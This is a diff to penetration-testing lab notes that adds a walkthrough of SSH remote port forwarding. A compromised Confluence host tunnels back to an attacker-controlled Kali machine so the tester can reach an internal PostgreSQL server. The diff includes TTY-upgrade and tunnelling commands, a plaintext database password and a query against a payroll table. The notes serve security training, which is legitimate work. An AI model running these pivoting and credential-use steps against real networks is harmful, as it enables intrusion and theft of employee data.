@@ -285,7 +285,7 @@ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 yes
 Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
 
-// If you get this error, upgrade your shell
+// If you get this error, upgrade your shell. if this doesn't work, try /bin/bash
 
 confluence$ python3 -c 'import pty; pty.spawn("/bin/sh")'
 
@@ -388,6 +388,82 @@ Let's take it further and portscan HRSHARES.
 kali $ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.210.217
 ```
 
-NOTE: Rpoxychain has high time out values by defual, so you can lower the tcp_read_time_out and tcp_connect_time_out values in the Proxychains conf to speed up port scanning.
+NOTE: Proxychains has high time out values by defual, so you can lower the tcp_read_time_out and tcp_connect_time_out values in the Proxychains conf to speed up port scanning.
 
 ### SSH Remote Port Forwarding
+
+```
+10.4.188.215 PGDATABASE01
+192.168.188.63 CONFLUENSE01
+```
+
+In the real world, firewalls will make this more challenging, especially for inbound traffic. Only in rare cases will we get creds for an SSH user taht allows us to SSH directly into a network and port forward. Very rarely will we be able to access ports that we bind to a network perimeter.
+
+More often, we'll be able to SSH out of a network, and those connections are more difficult to control.  So, whenever we can't connect to a port we bind to the network perimeter, we can possibly SSH out.
+
+Here comes SSH remote port forwarding. This works by connecting back to an attacker-controlled SSH server and binding the listening port there. It's kind of like a reverse shell for port forwarding.
+
+In local and dynamic port forwarding, the listening port is bound to the SSH client, but in remote port forwarding, the listening port is bound to the SSH server. The packet forwarding is now being done by the SSH client.
+
+Imagine we have a firewall now that only allows us to connect to Port TCP 8090 from Kali. We want to enum the PostgreSQL database on port 5432 on PGDATABASE01, for which CONFLUENCE01 doesn't have the tools to do. The firewall is preventing us from creating any port forward that requires opening the listening port on CONFLUENCE 01. But, CONFLUENCE01 does have an SSH client, so we can set up a Kali SSH server and connect  from CONFLUENCE01 to Kali over SSH. The listening TCP port 2345 is bound to the loopback interface on our Kali machine. The Kali SSH server pushes packets sent to this port through the SSH tunnel back to the SSH client on CONFLUENCE01, and then they are forwarded to PGDATABASE01 database port 5432.
+
+```console
+// enable ssh server on kali
+kali$ sudo systemctl start ssh
+
+// check it's open
+kali$ sudo ss -ntplu
+tcp    LISTEN  0       128              0.0.0.0:22            0.0.0.0:*      users:(("sshd",pid=2927889,fd=3))     
+tcp    LISTEN  0       128                 [::]:22               [::]:*      users:(("sshd",pid=2927889,fd=4))     
+```
+
+Now, get a reverse shell from CONFLUENCE01 using the same curl exploit and ensure you have a TTY shell. Then create the remote port forward as part of an SSH conn to Kali.
+
+NOTE: To conenct back to the Kali SSH server using ausername and password, we may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd_config
+
+We want to listen on port 2345 on our Kali machine (127.0.0.1:2345), and forward all traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).
+
+```console
+confluence$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+confluence$ ssh -N -R 127.0.0.1:2345:10.4.188.215:5432 kali@192.168.45.245
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '192.168.45.245 (192.168.45.245)' can't be established.
+ECDSA key fingerprint is SHA256:73sW9evPbJ564pflTwvpw+L70ZPkqF4/gYuu5s2H4jE.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+kali@192.168.45.245's password: 
+```
+
+Success, check the remote port forward is good:
+
+```console
+kali$ ss -ntplu
+tcp       LISTEN     0          128                    127.0.0.1:2345                 0.0.0.0:*    
+```
+
+Now, we can start probing port 2345 on the loopback iface of Kali, as if we are probing the PostgreSQL port on PGDATABASE01 directly!
+
+```console
+kali$ psql -h 127.0.0.1 -p 2345 -U postgres
+Password for user postgres: D@t4basePassw0rd!
+postgres# \l
+                                                        List of databases
+    Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | ICU Locale | ICU Rules |   Access privileges   
+------------+----------+----------+-----------------+-------------+-------------+------------+-----------+-----------------------
+ confluence | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
+ hr_backup  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
+ postgres   | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
+ template0  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
+            |          |          |                 |             |             |            |           | postgres=CTc/postgres
+ template1  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
+            |          |          |                 |             |             |            |           | postgres=CTc/postgres
+(5 rows)
+
+postgres# \c hr_backup
+postgres# SELECT * FROM payroll;
+```
+
+### SSH Remote Dynamic Port Forwarding
+
